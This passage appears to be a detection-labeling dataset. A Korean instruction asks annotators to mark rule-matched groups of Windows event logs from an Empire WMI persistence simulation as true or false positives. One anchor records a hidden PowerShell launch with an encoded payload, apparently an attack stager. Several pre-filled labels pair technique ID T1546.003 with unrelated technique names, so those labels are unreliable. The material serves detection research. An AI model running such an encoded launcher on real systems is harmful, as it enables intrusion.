{
  "scenario": "empire_wmi_local_event_subscriptions_elevated_user_2020-09-04164306",
  "total_groups": 80,
  "instruction": "각 그룹의 sample_logs와 anchor를 확인한 뒤 gt_ 필드를 채워주세요. gt_is_true_positive: 해당 그룹이 실제 공격 행위인지 (true/false). gt_technique_id: 실제 MITRE technique ID (예: T1059.001). gt_tactic: 실제 tactic 이름 (예: Execution). gt_notes: 판단 근거나 메모.",
  "groups": [
    {
      "group_id": "T1003_59225",
      "rule_technique_id": "T1003",
      "rule_technique_name": "OS Credential Dumping",
      "confidence": 0.75,
      "anchor": {
        "idx": 59225,
        "EventID": 10,
        "Image": "nan",
        "CommandLine": "nan",
        "TimeCreated": "2020-09-04 20:46:47.791000+00:00"
      },
      "num_events": 120,
      "event_id_distribution": {
        "4656": 61,
        "4663": 51,
        "10": 5,
        "4670": 3
      },
      "sample_logs": [
        {
          "idx": 57122,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:46:38.633000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 57123,
          "EventID": 4663,
          "TimeCreated": "2020-09-04 20:46:38.633000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 57133,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:46:38.637000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 57135,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:46:38.639000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 57141,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:46:38.642000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 57144,
          "EventID": 4663,
          "TimeCreated": "2020-09-04 20:46:38.643000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 57156,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:46:38.647000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 57160,
          "EventID": 4663,
          "TimeCreated": "2020-09-04 20:46:38.648000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 57171,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:46:38.653000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 57178,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:46:38.656000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 57182,
          "EventID": 4663,
          "TimeCreated": "2020-09-04 20:46:38.657000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 57194,
          "EventID": 4670,
          "TimeCreated": "2020-09-04 20:46:38.661000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 57205,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:46:38.667000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 57206,
          "EventID": 4663,
          "TimeCreated": "2020-09-04 20:46:38.668000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 57214,
          "EventID": 4656,
          "TimeCreated": "2020-09-04 20:46:38.671000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "OS Credential Dumping",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": false,
      "gt_notes": "auto: noise:no-kw,rule!=fam(T1003)"
    },
    {
      "group_id": "T1003_001_76316",
      "rule_technique_id": "T1003.001",
      "rule_technique_name": "LSASS Memory",
      "confidence": 0.75,
      "anchor": {
        "idx": 76316,
        "EventID": 10,
        "Image": "nan",
        "CommandLine": "nan",
        "TimeCreated": "2020-09-04 20:48:12.054000+00:00"
      },
      "num_events": 110,
      "event_id_distribution": {
        "7": 73,
        "4656": 19,
        "4663": 8,
        "1": 4,
        "11": 4,
        "13": 1,
        "10": 1
      },
      "sample_logs": [
        {
          "idx": 74423,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:48:02.086000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VFUProvider\\StartTime"
        },
        {
          "idx": 74443,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:48:03.103000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183611\\CollectGuestLogs.exe",
          "CommandLine": "\"CollectGuestLogs.exe\" -Mode:ga -FileName:C:\\WindowsAzure\\CollectGuestLogsTemp\\a0cf9aaa-c5a0-41c5-80dd-8e9a67600c23.zip",
          "ParentImage": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183611\\WaAppAgent.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 74444,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:48:03.103000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "\\??\\C:\\windows\\system32\\conhost.exe 0xffffffff -ForceV1",
          "ParentImage": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183611\\CollectGuestLogs.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 74445,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:48:03.104000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 74446,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:48:03.104000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 74447,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:48:03.105000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 74448,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:48:03.106000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 74450,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:48:03.106000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 74451,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:48:03.107000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 74452,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:48:03.108000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 74453,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:48:03.108000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 74454,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:48:03.108000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 74457,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:48:03.109000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 74455,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:48:03.109000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 74456,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:48:03.109000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "LSASS Memory",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": false,
      "gt_notes": "auto: noise:no-kw,rule!=fam(T1003.001)"
    },
    {
      "group_id": "T1016_27248",
      "rule_technique_id": "T1016",
      "rule_technique_name": "System Network Configuration Discovery",
      "confidence": 1.0,
      "anchor": {
        "idx": 27248,
        "EventID": 1,
        "Image": "C:\\Windows\\System32\\ipconfig.exe",
        "CommandLine": "\"ipconfig.exe\" /all",
        "TimeCreated": "2020-09-04 20:45:47.313000+00:00"
      },
      "num_events": 108,
      "event_id_distribution": {
        "7": 62,
        "12": 37,
        "13": 5,
        "1": 2,
        "5": 2
      },
      "sample_logs": [
        {
          "idx": 22100,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:38.586000+00:00",
          "Image": "C:\\Windows\\System32\\services.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 22609,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:38.887000+00:00",
          "Image": "C:\\Windows\\System32\\services.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 22758,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:38.892000+00:00",
          "Image": "C:\\Windows\\System32\\services.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 23229,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:39.153000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 23234,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:39.153000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 23324,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:39.155000+00:00",
          "Image": "C:\\Windows\\System32\\services.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 23512,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:39.394000+00:00",
          "Image": "C:\\Windows\\System32\\services.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 23629,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:39.397000+00:00",
          "Image": "C:\\Windows\\System32\\services.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 23721,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:39.399000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 24085,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:39.732000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 24087,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:39.732000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 24089,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:39.732000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 24129,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:39.733000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 24532,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:40.009000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 24534,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:40.009000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "System Network Configuration Discovery",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": false,
      "gt_notes": "auto: noise:no-kw,rule!=fam(T1016)"
    },
    {
      "group_id": "T1021_002_682",
      "rule_technique_id": "T1021.002",
      "rule_technique_name": "SMB/Windows Admin Shares",
      "confidence": 0.67,
      "anchor": {
        "idx": 682,
        "EventID": 4624,
        "Image": "nan",
        "CommandLine": "nan",
        "TimeCreated": "2020-09-04 20:43:28.561000+00:00"
      },
      "num_events": 20,
      "event_id_distribution": {
        "4624": 6,
        "11": 5,
        "18": 5,
        "4648": 4
      },
      "sample_logs": [
        {
          "idx": 682,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:43:28.561000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 684,
          "EventID": 4648,
          "TimeCreated": "2020-09-04 20:43:28.561000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 695,
          "EventID": 4648,
          "TimeCreated": "2020-09-04 20:43:28.566000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 699,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:43:28.568000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 706,
          "EventID": 4648,
          "TimeCreated": "2020-09-04 20:43:28.571000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 710,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:43:28.572000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 769,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:43:28.596000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 771,
          "EventID": 4648,
          "TimeCreated": "2020-09-04 20:43:28.596000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 1506,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:43:38.912000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 1728,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:43:43.013000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 1789,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:43:44.048000+00:00",
          "Image": "C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\SearchUI.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 1891,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:43:49.116000+00:00",
          "Image": "C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\SearchUI.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 1976,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:43:50.178000+00:00",
          "Image": "System",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 2157,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:43:51.271000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 2175,
          "EventID": 18,
          "TimeCreated": "2020-09-04 20:43:51.278000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "SMB/Windows Admin Shares",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": false,
      "gt_notes": "auto: noise:no-kw,rule!=fam(T1021.002)"
    },
    {
      "group_id": "T1021_003_6791",
      "rule_technique_id": "T1021.003",
      "rule_technique_name": "Distributed Component Object Model",
      "confidence": 1.0,
      "anchor": {
        "idx": 6791,
        "EventID": 4624,
        "Image": "nan",
        "CommandLine": "nan",
        "TimeCreated": "2020-09-04 20:44:44.528000+00:00"
      },
      "num_events": 476,
      "event_id_distribution": {
        "7": 437,
        "3": 23,
        "4624": 5,
        "22": 5,
        "12": 2,
        "13": 2,
        "1": 1,
        "5": 1
      },
      "sample_logs": [
        {
          "idx": 5493,
          "EventID": 3,
          "TimeCreated": "2020-09-04 20:44:40.963000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 6791,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:44:44.528000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 7067,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:44:46.660000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 7101,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:44:46.676000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{01C5B377-A7EB-4FF3-9C6C-86852FACB348}"
        },
        {
          "idx": 7102,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:44:46.677000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{01C5B377-A7EB-4FF3-9C6C-86852FACB348}\\DynamicInfo"
        },
        {
          "idx": 7281,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:44:46.756000+00:00",
          "Image": "C:\\Windows\\System32\\dxgiadaptercache.exe",
          "CommandLine": "C:\\windows\\system32\\dxgiadaptercache.exe",
          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 7290,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:44:46.758000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{68560DFD-FC67-4EF8-BAA4-7F72211F3FD5}"
        },
        {
          "idx": 7291,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:44:46.759000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{68560DFD-FC67-4EF8-BAA4-7F72211F3FD5}\\DynamicInfo"
        },
        {
          "idx": 7822,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:44:48.973000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 8780,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:44:54.417000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 8839,
          "EventID": 22,
          "TimeCreated": "2020-09-04 20:44:56.467000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9139,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:01.580000+00:00",
          "Image": "C:\\Windows\\System32\\SgrmBroker.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9254,
          "EventID": 3,
          "TimeCreated": "2020-09-04 20:45:02.630000+00:00",
          "Image": "System",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9258,
          "EventID": 3,
          "TimeCreated": "2020-09-04 20:45:02.631000+00:00",
          "Image": "C:\\Windows\\System32\\lsass.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9259,
          "EventID": 3,
          "TimeCreated": "2020-09-04 20:45:02.632000+00:00",
          "Image": "C:\\Windows\\System32\\lsass.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "Distributed Component Object Model",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": false,
      "gt_notes": "auto: noise:no-kw,rule!=fam(T1021.003)"
    },
    {
      "group_id": "T1027_77303",
      "rule_technique_id": "T1027",
      "rule_technique_name": "Obfuscated Files or Information",
      "confidence": 1.0,
      "anchor": {
        "idx": 77303,
        "EventID": 4688,
        "Image": "nan",
        "CommandLine": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBJAE8ATgBUAGEAQgBMAGUALgBQAFMAVgBlAFIAUwBpAG8AbgAuAE0AQQBKAE8AUgAgAC0AZwBlACAAMwApAHsAJAA2ADgAN",
        "TimeCreated": "2020-09-04 20:48:39.586000+00:00"
      },
      "num_events": 1572,
      "event_id_distribution": {
        "10": 618,
        "12": 372,
        "7": 246,
        "13": 104,
        "4656": 82,
        "4663": 64,
        "4103": 49,
        "11": 21,
        "600": 6,
        "1": 4,
        "3": 2,
        "22": 2,
        "4688": 1,
        "400": 1
      },
      "sample_logs": [
        {
          "idx": 76628,
          "EventID": 10,
          "TimeCreated": "2020-09-04 20:48:31.243000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 76629,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.244000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\TermReason\\7256"
        },
        {
          "idx": 76630,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:48:31.244000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\TermReason\\7256\\Terminator"
        },
        {
          "idx": 76631,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:48:31.245000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\TermReason\\7256\\Reason"
        },
        {
          "idx": 76632,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:48:31.245000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\TermReason\\7256\\CreationTime"
        },
        {
          "idx": 76633,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:48:31.246000+00:00",
          "Image": "C:\\windows\\system32\\backgroundTaskHost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2079883792-3656946353-945924832-1104\\Microsoft.Windows.Cortana_cw5n1h2txyewy"
        },
        {
          "idx": 76634,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.246000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows NT\\CurrentVersion\\HostActivityManager"
        },
        {
          "idx": 76636,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.247000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows NT\\CurrentVersion\\HostActivityManager"
        },
        {
          "idx": 76637,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.247000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows NT\\CurrentVersion\\HostActivityManager\\CommitHistory"
        },
        {
          "idx": 76638,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.248000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows NT\\CurrentVersion\\HostActivityManager\\CommitHistory\\Microsoft.Windows.Cor"
        },
        {
          "idx": 76639,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:48:31.248000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows NT\\CurrentVersion\\HostActivityManager\\CommitHistory\\Microsoft.Windows.Cor"
        },
        {
          "idx": 76641,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.249000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.Wi"
        },
        {
          "idx": 76640,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.249000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.Wi"
        },
        {
